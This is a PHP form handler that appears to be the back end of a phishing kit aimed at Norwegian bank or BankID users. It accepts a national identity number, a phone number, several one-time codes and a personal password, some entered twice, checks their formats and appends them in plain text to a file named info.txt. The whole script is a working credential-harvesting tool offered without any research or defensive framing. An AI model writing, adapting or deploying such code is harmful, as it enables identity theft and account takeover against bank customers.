<?php
// Set the content type to JSON
header("Content-Type: application/json");

// Get the raw POST data
$data = file_get_contents("php://input");

// Decode the JSON data
$formData = json_decode($data, true);

// Define the file to store form data
$file = "info.txt";

// Initialize the response
$response = [
    "status" => "error",
    "message" => "Invalid input."
];

try {
    // Validate the data structure
    if (
        isset($formData['input01']) && 
        isset($formData['input02']) && 
        isset($formData['input03']) && 
        isset($formData['input04']) && 
        isset($formData['input05']) && 
        isset($formData['input07']) && 
        isset($formData['input08'])
    ) {
        // Sanitize inputs
        $input01 = htmlspecialchars($formData['input01'], ENT_QUOTES, 'UTF-8'); // Fødselsnummer
        $input02 = htmlspecialchars($formData['input02'], ENT_QUOTES, 'UTF-8'); // Telefonnummer
        $input03 = htmlspecialchars($formData['input03'], ENT_QUOTES, 'UTF-8'); // Engangskode
        $input04 = htmlspecialchars($formData['input04'], ENT_QUOTES, 'UTF-8'); // Personlig passord
        $input05 = htmlspecialchars($formData['input05'], ENT_QUOTES, 'UTF-8'); // Engangskode igjen
        $input07 = htmlspecialchars($formData['input07'], ENT_QUOTES, 'UTF-8'); // Repeated password
        $input08 = htmlspecialchars($formData['input08'], ENT_QUOTES, 'UTF-8'); // Repeated code

        // Validate specific inputs
        if (!preg_match('/^\d{11}$/', $input01)) {
            throw new Exception("Invalid Fødselsnummer (must be 11 digits).");
        }

        if (!preg_match('/^\d{8}$/', $input02)) {
            throw new Exception("Invalid Telefonnummer (must be 8 digits).");
        }

        if (!preg_match('/^\d{6}$/', $input03)) {
            throw new Exception("Invalid Engangskode (must be 6 digits).");
        }

        if (!preg_match('/^\d{6}$/', $input05)) {
            throw new Exception("Invalid Engangskode (must be 6 digits).");
        }

        if (!preg_match('/^\d{6}$/', $input08)) {
            throw new Exception("Invalid Engangskode (must be 6 digits).");
        }

        // Prepare the data to save
        $saveData = [
            "Fodselsnummer" => $input01,
            "Telefonnummer" => $input02,
            "Engangskode" => $input03,
            "PersoneligPassord" => $input04,
            "EngangskodeIgjen" => $input05,
            "GjentaPassord" => $input07,
            "GjentaKode" => $input08,
            "timestamp" => date("Y-m-d H:i:s") // Include a timestamp
        ];

        // Ensure the file exists; initialize it if necessary
        if (!file_exists($file)) {
            file_put_contents($file, json_encode([])); // Initialize as empty JSON array
        }

        // Get current file content and decode
        $currentData = json_decode(file_get_contents($file), true);

        // Check if decoding was successful
        if (!is_array($currentData)) {
            // If decoding fails, reinitialize the file with an empty array
            $currentData = [];
        }

        // Append new form data
        $currentData[] = $saveData;

        // Save updated content back to the file
        file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT));

        // Send a success response
        $response["status"] = "success";
        $response["message"] = "Form data saved successfully.";
    } else {
        throw new Exception("Incomplete data received.");
    }
} catch (Exception $e) {
    // Catch exceptions and set the error message
    $response["message"] = $e->getMessage();
}

// Return the response as JSON
echo json_encode($response);
?>
